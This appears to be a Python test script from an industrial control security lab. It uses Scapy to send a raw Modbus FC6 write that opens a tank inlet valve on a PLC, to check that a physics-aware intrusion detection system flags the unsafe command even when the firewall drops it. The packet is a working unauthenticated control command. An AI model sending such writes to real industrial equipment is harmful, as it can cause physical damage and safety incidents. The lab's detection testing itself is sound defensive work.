#!/usr/bin/env python3
"""
OT Security Lab - Physics-Aware Violation Simulator (real Modbus stimulus)

Sends a genuine Modbus/TCP FC6 "Write Single Register" that opens the intake
inlet valve (HR 0 = 1). No process state is injected: when a real PLC program is
loaded and the HMI is polling, the gateway's physics-aware IDS has already
shadowed the live tank level from real PLC responses, so the write is evaluated
against the actual process state.

The write originates from the Level 4 attacker, is denied by the zone firewall
at the PLC boundary, but is still observed by the gateway IDS - demonstrating
that a dropped attack is not an undetected attack.
"""
import os
import sys

try:
    from scapy.all import IP, TCP, Raw, send
except ImportError:
    print("Error: Scapy not found.")
    sys.exit(1)

PLC_IP = os.getenv("OT_PLC_IP", "172.21.0.10")
MODBUS_PORT = 502

print("--- Starting Physics-Aware Violation Simulation (real Modbus write) ---")


def send_raw_modbus(dst, payload):
    packet = IP(dst=dst) / TCP(dport=MODBUS_PORT) / Raw(load=payload)
    send(packet, verbose=False)


# Modbus FC6: open the inlet valve while the real tank level is high.
# MBAP: TransID 1, Proto 0, Length 6, Unit 1; PDU: FC 6, reg 0, value 1.
mbap_write = b"\x00\x01\x00\x00\x00\x06\x01"
fc_write = b"\x06\x00\x00\x00\x01"
print("[STIMULUS] Sending real Modbus FC6: OPEN Inlet Valve (HR0=1)...")
send_raw_modbus(PLC_IP, mbap_write + fc_write)

print("\n--- Simulation Complete. Check logs for PROCESS_SAFETY_VIOLATION. ---")
